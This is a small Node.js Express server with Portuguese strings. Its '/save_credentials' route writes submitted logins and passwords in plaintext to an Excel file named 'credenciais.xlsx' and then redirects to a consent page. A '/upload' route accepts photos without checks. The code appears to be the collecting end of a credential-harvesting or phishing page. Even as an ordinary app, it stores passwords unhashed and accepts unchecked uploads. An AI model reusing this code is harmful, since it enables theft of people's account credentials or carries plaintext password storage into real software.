const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const XLSX = require('xlsx');
const multer = require('multer');
const path = require('path');

const app = express();
const port = 3000;

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads');
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

const filePath = './credenciais.xlsx';

function createWorkbookIfNotExists() {
    if (!fs.existsSync(filePath)) {
        const wb = XLSX.utils.book_new();
        const ws = XLSX.utils.aoa_to_sheet([['Login', 'Senha']]);
        XLSX.utils.book_append_sheet(wb, ws, 'Credenciais');
        XLSX.writeFile(wb, filePath);
    }
}

app.post('/save_credentials', (req, res) => {
    const login = req.body.login;
    const password = req.body.password;

    createWorkbookIfNotExists();

    const wb = XLSX.readFile(filePath);
    const ws = wb.Sheets['Credenciais'];

    const data = XLSX.utils.sheet_to_json(ws, { header: 1 });
    data.push([login, password]);

    const newWs = XLSX.utils.aoa_to_sheet(data);
    wb.Sheets['Credenciais'] = newWs;
    XLSX.writeFile(wb, filePath);

    res.redirect('/consent.html');
});

app.post('/upload', upload.single('photo'), (req, res) => {
    if (req.file) {
        res.send('Foto recebida com sucesso!');
    } else {
        res.status(400).send('Erro ao enviar a foto.');
    }
});

// Rota pública
app.get('/public', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});
